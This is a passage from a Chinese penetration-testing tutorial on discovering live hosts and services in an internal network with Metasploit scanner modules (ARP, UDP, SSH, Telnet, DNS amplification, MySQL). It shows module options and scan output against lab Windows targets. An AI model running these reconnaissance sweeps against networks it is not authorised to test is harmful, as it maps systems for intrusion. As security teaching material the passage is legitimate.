msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span> appears to be up <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span><span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.2</span> appears to be up <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span><span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> appears to be up <span class="token punctuation">(</span>VMware<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002222945816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>5、基于scanner/discovery/udp_sweep发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
BATCHSIZE <span class="token number">256</span> yes The number of hosts to probe in each set
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> yes The target address range or CIDR identifier
THREADS <span class="token number">50</span> yes The number of concurrent threads 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending <span class="token number">13</span> probes to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span>‐<span class="token operator">&gt;</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.255</span> <span class="token punctuation">(</span><span class="token number">256</span> hosts<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Discovered DNS on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">53</span> <span class="token punctuation">(</span>ce2a8500000100010000000007564552  <span class="token number">53494f</span><span class="token number">4e0442494</span>e440000100003c00c0010000300000001001a19737572656c7920796f7
<span class="token number">5206</span>d757374206265206a6f6b696e67<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Discovered NetBIOS on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.2</span><span class="token punctuation">:</span><span class="token number">137</span> <span class="token punctuation">(</span>JOHN‐PC<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">00</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span>WORKGROUP<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">00</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>G <span class="token punctuation">:</span>JOHN‐PC<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">20</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span>WORKGROUP<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">1</span>e<span class="token operator">&gt;</span><span class="token punctuation">:</span>G <span class="token punctuation">:</span>WORKGROUP<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">1</span>d<span class="token operator">&gt;</span><span class="token punctuation">:</span>U
<span class="token punctuation">:</span>__MSBROWSE__ <span class="token operator">&lt;</span><span class="token number">01</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>G <span class="token punctuation">:</span><span class="token number">4</span>c<span class="token punctuation">:</span>cc<span class="token punctuation">:</span><span class="token number">6</span>a<span class="token punctuation">:</span>e3<span class="token punctuation">:</span><span class="token number">51</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Discovered NetBIOS on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">137</span> <span class="token punctuation">(</span>WIN03X64<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">00</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span>WIN03X64<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">20</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span>WORKGROUP<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">00</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>G <span class="token punctuation">:</span>WORKGROUP<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">1</span>e<span class="token operator">&gt;</span><span class="token punctuation">:</span>G <span class="token punctuation">:</span>WIN03X64<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">03</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U
<span class="token punctuation">:</span>ADMINISTRA TOR<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">03</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span>WIN03X64<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">01</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">85</span><span class="token punctuation">:</span>d6<span class="token punctuation">:</span><span class="token number">7</span>d<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100222301058.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">30</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>msf<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji<span class="token operator">-</span>di<span class="token operator">-</span>yi<span class="token operator">-</span>ji
</code></pre>
<hr>
<h2><a id="542_MSF2_1962"></a>5.4.2 基于MSF发现内网存活主机（2）</h2>
<p>攻击机： 192.168.1.5 Debian</p>
<p>靶机： 192.168.1.2 Windows 7</p>
<p>192.168.1.115 Windows 2003</p>
<p>192.168.1.119 Windows 2003</p>
<p><strong>（1）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version
</code></pre>
<p><strong>（2）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>telnet<span class="token operator">/</span>telnet_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>dns<span class="token operator">/</span>dns_amp
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql_version
</code></pre>
<p><strong>6、基于auxiliary/scanner/ssh/ssh_version发现SSH服务</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_version<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> yes The target address range or CIDR identifier
RPORT <span class="token number">22</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
THREADS <span class="token number">50</span> yes The number of concurrent threads
TIMEOUT <span class="token number">30</span> yes Timeout <span class="token keyword">for</span> the SSH probe 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">22</span> ‐ SSH server version<span class="token punctuation">:</span> SSH‐<span class="token number">2.0</span>‐OpenSSH_7<span class="token punctuation">.</span><span class="token number">9</span>p1 Debian‐<span class="token number">5</span> <span class="token punctuation">(</span> service<span class="token punctuation">.</span>version<span class="token operator">=</span><span class="token number">7.9</span>p1 openssh<span class="token punctuation">.</span>comment<span class="token operator">=</span>Debian‐<span class="token number">5</span> service<span class="token punctuation">.</span>vendor<span class="token operator">=</span>OpenBSD
service<span class="token punctuation">.</span>family<span class="token operator">=</span>OpenSSH service<span class="token punctuation">.</span>product<span class="token operator">=</span>OpenSSH service<span class="token punctuation">.</span>cpe23<span class="token operator">=</span>cpe<span class="token punctuation">:</span><span class="token operator">/</span>a<span class="token punctuation">:</span>openb
sd<span class="token punctuation">:</span>openssh<span class="token punctuation">:</span><span class="token number">7.9</span>p1 os<span class="token punctuation">.</span>vendor<span class="token operator">=</span>Debian os<span class="token punctuation">.</span>family<span class="token operator">=</span>Linux os<span class="token punctuation">.</span>product<span class="token operator">=</span>Linux os<span class="token punctuation">.</span>cpe
<span class="token number">23</span><span class="token operator">=</span>cpe<span class="token punctuation">:</span><span class="token operator">/</span>o<span class="token punctuation">:</span>debian<span class="token punctuation">:</span>debian_linux<span class="token punctuation">:</span>‐ service<span class="token punctuation">.</span>protocol<span class="token operator">=</span>ssh fingerprint_db<span class="token operator">=</span>ssh<span class="token punctuation">.</span>banner <span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">52</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">20</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">95</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">100</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">39</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">103</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">40</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">131</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">51</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">154</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">180</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">70</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">206</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">235</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">91</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002223220682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>7、基于auxiliary/scanner/telnet/telnet_version发现TELNET服务</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>telnet<span class="token operator">/</span>telnet_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>telnet<span class="token operator">/</span>telnet_version<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
PASSWORD no The password <span class="token keyword">for</span> the specified username
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> yes The target address range or CIDR identifier
RPORT <span class="token number">23</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
THREADS <span class="token number">50</span> yes The number of concurrent threads
TIMEOUT <span class="token number">30</span> yes Timeout <span class="token keyword">for</span> the Telnet probe
USERNAME no The username to authenticate as 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>telnet<span class="token operator">/</span>telnet_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">23</span> ‐ <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">23</span> TELNET Welcome to Microsoft Telnet Service \x0a\x0a\x0dlogin<span class="token punctuation">:</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002223250181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>8、基于scanner/discovery/udp_probe发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
CHOST no The local client address
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> yes The target address range or CIDR identifier
THREADS <span class="token number">50</span> yes The number of concurrent threads 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Discovered NetBIOS on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.2</span><span class="token punctuation">:</span><span class="token number">137</span> <span class="token punctuation">(</span>JOHN‐PC<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">00</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span>WORKGROUP<span class="token punctuation">:</span>
<span class="token operator">&lt;</span><span class="token number">00</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>G <span class="token punctuation">:</span>JOHN‐PC<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">20</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span>WORKGROUP<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">1</span>e<span class="token operator">&gt;</span><span class="token punctuation">:</span>G <span class="token punctuation">:</span>WORKGROUP<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">1</span>d<span class="token operator">&gt;</span><span class="token punctuation">:</span>U
<span class="token punctuation">:</span>__MSBROWSE__ <span class="token operator">&lt;</span><span class="token number">01</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>G <span class="token punctuation">:</span><span class="token number">4</span>c<span class="token punctuation">:</span>cc<span class="token punctuation">:</span><span class="token number">6</span>a<span class="token punctuation">:</span>e3<span class="token punctuation">:</span><span class="token number">51</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Discovered DNS on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">53</span> <span class="token punctuation">(</span>de778500000100010000000007564552  <span class="token number">53494f</span><span class="token number">4e0442494</span>e440000100003c00c0010000300000001001a19737572656c7920796f7
<span class="token number">5206</span>d757374206265206a6f6b696e67<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">43</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">52</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">20</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">89</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">34</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Discovered NetBIOS on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">137</span> <span class="token punctuation">(</span>WIN03X64<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">00</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span>WIN03X64<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">20</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span>WORKGROUP<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">00</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>G <span class="token punctuation">:</span>WORKGROUP<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">1</span>e<span class="token operator">&gt;</span><span class="token punctuation">:</span>G <span class="token punctuation">:</span>WIN03X64<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">03</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U
<span class="token punctuation">:</span>ADMINISTRA TOR<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">03</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span>WIN03X64<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token number">01</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>U <span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">85</span><span class="token punctuation">:</span>d6<span class="token punctuation">:</span><span class="token number">7</span>d<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">103</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">40</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">140</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">54</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">163</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">63</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">184</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">71</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">212</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">82</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">231</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">90</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002223321107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>9、基于auxiliary/scanner/dns/dns_amp发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>dns<span class="token operator">/</span>dns_amp<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>dns<span class="token operator">/</span>dns_amp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
BATCHSIZE <span class="token number">256</span> yes The number of hosts to probe in each set
DOMAINNAME isc<span class="token punctuation">.</span>org yes Domain to use <span class="token keyword">for</span> the DNS request
FILTER no The filter string <span class="token keyword">for</span> capturing traffic
INTERFACE no The name of the interface
PCAPFILE no The name of the PCAP capture file to process
QUERYTYPE ANY yes Query <span class="token function">type</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> NS<span class="token punctuation">,</span> SOA<span class="token punctuation">,</span> MX<span class="token punctuation">,</span> TXT<span class="token punctuation">,</span> AAAA<span class="token punctuation">,</span> RRSIG<span class="token punctuation">,</span> DNSKEY<span class="token punctuation">,</span> ANY<span class="token punctuation">)</span>
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> yes The target address range or CIDR identifier
RPORT <span class="token number">53</span> yes The target port <span class="token punctuation">(</span>UDP<span class="token punctuation">)</span>
SNAPLEN <span class="token number">65535</span> yes The number of bytes to capture
THREADS <span class="token number">50</span> yes The number of concurrent threads
TIMEOUT <span class="token number">500</span> yes The number of seconds to wait <span class="token keyword">for</span> new data 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>dns<span class="token operator">/</span>dns_amp<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending DNS probes to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span>‐<span class="token operator">&gt;</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.255</span> <span class="token punctuation">(</span><span class="token number">256</span> hosts<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending <span class="token number">67</span> bytes to each host using the IN ANY isc<span class="token punctuation">.</span>org request
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">53</span> ‐ Response is <span class="token number">530</span> bytes <span class="token punctuation">[</span><span class="token number">7.91</span>x Amplification<span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002223343913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>10、基于auxiliary/scanner/mysql/mysql_version发现mysql服务</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql_version<span class="token punctuation">)</span><span class="token punctuation">:</span> 

